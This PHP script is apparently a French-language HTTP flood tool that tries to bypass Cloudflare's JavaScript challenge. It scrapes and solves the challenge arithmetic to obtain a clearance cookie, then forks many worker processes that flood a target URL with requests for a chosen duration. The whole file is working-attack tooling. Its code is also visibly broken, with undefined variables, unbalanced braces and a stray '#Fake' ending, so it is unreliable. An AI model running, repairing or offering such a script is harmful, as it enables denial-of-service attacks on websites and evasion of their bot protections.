<?PHP
error_reporting(0);
function multiequation($string) {
preg_match("/\)\+\(/", $string, $data);
if ($data == NULL) {
return false; }
else{return true;}}function rand_line($fileName, $maxLineLength = 4096) {
$handle = @fopen($fileName, "r");
if ($handle) {
$random_line = null;
$line = null;
$count = 0;
while (($line = fgets($handle, $maxLineLength)) !== false) {
$count++;
if(rand() % $count == 0) {
$random_line = $line;}}
if (!feof($handle)) {
echo "Erreur404 : Unexpected\n";
fclose($handle);
return null;
} else {
fclose($handle);}
return $random_line;}}    
function cfbypass($domain, $useragent){
$rd = explode("/", $domain);
$tlen = strlen($rd[2]);
$array = array();
$data = curl_exec($cURL);
preg_match("/var t,r,a,f,(.*?)\"/", $data, $jschl_vc);
preg_match("/setTimeout\(function\(\){(.*?);a\.value/s", $data, $vars);
$full = trim($vars[1]);
preg_match("/var t,r,a,f,(.*?):/", $full, $mainvar);
$mvar = explode("=", trim($mainvar[1]));
preg_match("/\"(.*?)\"/", $mvar[1], $v2);
$fvar = "".$mvar[0].".".$v2[1]."";
list($line1) = explode("\n", $full);
$equation1 = explode(":", $line1);
preg_match_all("/\((.*?)\)/", $equation1[1], $eq1m, PREG_SET_ORDER);
$count = count($eq1m);if ($count == 0) {
$lmao = explode("}", $equation1[1]);
$yolo = explode("+", $lmao[0]);
$nc = 0; foreach ($yolo as $int){
if ($int == "!" || $int == "!![]" || $int == "![]") {$nc++;}}
$ans1 = "$nc\n";}else{foreach ($eq1m as $eq) {
if (substr($eq[1], 0, 1) == "(") {
$furl = substr($eq[1], 1);$yolo1 = explode("+", $furl);
$mc = 0;foreach ($yolo1 as $int1) {
if ($int1 == "!" || $int1 == "!![]" || $int1 == "![]") {$mc++;}}}else{
$yolo2 = explode("+", $eq[1]);$mc1 = 0;
foreach ($yolo2 as $int2) {
if ($int2 == "!" || $int2 == "!![]" || $int2 == "![]") {$mc1++;}}}}$ans1 = "$mc$mc1\n";}
preg_match("/$fvar(.*?);a\.value/s", $data, $NowWeActuallyStart);
$itbegins = explode(";", $NowWeActuallyStart[1]);
foreach ($itbegins as $begin) {
$first = substr($begin, 0, 1);
if (!ctype_alpha($first)) {
$operator = substr($begin, 0, 3);
$top = substr($begin, 0);
$lick = "".$fvar."".$top."";
$mathit = explode("=", $lick);
$oper = substr($operator, 0, 1);
$solve1 = explode("+", $mathit[1]);$c1 = 0;
foreach ($lastlast1 as $me21) {
if ($me21 == "!" || $me21 == "!![]" || $me21 == "![]") {
$ending1++;}}}}
$fanswer1 = "".$soclose1."".$ending1."";
array_push($array, "$fanswer1$oper");
}}else{$operator = substr($begin, strlen($fvar), 3);
$top = substr($begin, 0);
$oper = substr($operator, 0, 1);
$mathit = explode("=", $begin);
$solve2 = explode("+", $mathit[1]);
$c21 = 0;
if (multiequation($mathit[1]) == FALSE){
foreach ($solve2 as $boolv2){
if ($boolv2 == "!" || $boolv2 == "!![]" || $boolv2 == "![]") {$c21++;}}
array_push($array, "$c21$oper");
} else if (multiequation($mathit[1]) == TRUE) {
$swag = explode(")+(", $mathit[1]);
foreach ($swag as $swiggity) {
$first = substr($swiggity, 0, 3);
if ($first == "+((") {
$new = substr($swiggity, 3);
$firstlast = explode("+", $new);
$soclose = 0;
foreach ($firstlast as $me1) {
if ($me1 == "!" || $me1 == "!![]" || $me1 == "![]") {
$soclose++; }}} else {$new2 = substr($swiggity, 0, -2);
$lastlast = explode("+", $new2);
$ending = 0;
foreach ($lastlast as $me2) {
if ($me2 == "!" || $me2 == "!![]" || $me2 == "![]") {
$ending++;}}}}$fanswer = "".$soclose."".$ending."";
array_push($array, "$fanswer$oper");}}}
$FINALLY = $ans1;
foreach($array as $element) {
$method = substr($element, -1);
$number = substr($element, 0, -1);
if ($method == "+") {
$FINALLY += $number; } else if ($method == "-") {
$FINALLY -= $number; } else if ($method == "*") { $FINALLY = $FINALLY * $number; }}
$tba = ($FINALLY + $tlen);
preg_match("/jschl_vc\" value=\"(.*?)\"/", $data, $cid);
preg_match("/pass\" value=\"(.*?)\"/", $data, $pass);
$url = "".$domain."cdn-cgi/l/chk_jschl?jschl_vc=$cid[1]&pass=$pass[1]&jschl_answer=$tba";
usleep(3500000);
$check = curl_init();
curl_setopt($check, CURLOPT_URL, $url);
curl_setopt($check, CURLOPT_RETURNTRANSFER, true);
curl_setopt($check, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($check, CURLOPT_USERAGENT, $useragent);
curl_setopt($check, CURLOPT_HEADER, 1);
curl_setopt($check, CURLOPT_COOKIEFILE, "cookie.txt");
$data2 = curl_exec($check);
preg_match_all('/^Set-Cookie:\s*([^\r\n]*)/mi', $data2, $ms); $cookies = array();
foreach ($ms[1] as $m){
list($name, $value) = explode('=', $m, 2);
$cookies[$name] = $value;}
return $bypasscookie; }
if($argc != 4) {
echo "Utilisation : php $argv[0] http://example.com/ <Threads> <Temps>\n";
die(); } $end = time() + $argv[3]; $useragents;    
$childcount = $argv[2];
echo "Attaque Lancer sur $argv[1] pendant $argv[3] Seconds !\n";
$UA = $useragents[array_rand($useragents)];
$clearence_cookie = cfbypass($argv[1], $UA);
if (stripos($clearence_cookie, "cf_clearance")) {
echo "Cookie Spamed : $clearence_cookie\n\nBypass Réussie, attaque en cours...\n";
sleep(1);
}else{ echo "ByPass Failed :/ !\n";die();}
for($i = 0; $i < $childcount; $i ++)
{
$pid = pcntl_fork();
if ($pid == -1) { echo "Erreur404\n"; exit; } else if ($pid) {
continue; }else{ while($end > time()) {
$dedaws = curl_init();
curl_setopt($dedaws, CURLOPT_URL, ''.$argv[1].'?'.uniqid().'');
curl_setopt($dedaws, CURLOPT_RETURNTRANSFER, true);
curl_setopt($dedaws, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($dedaws, CURLOPT_USERAGENT, $UA);
curl_setopt($dedaws, CURLOPT_COOKIE, $clearence_cookie);
$data2 = curl_exec($dedaws);curl_close($dedaws);}die;}}for($j = 0; $j < $childcount; $j++){$pid = pcntl_wait($status);}
#Fake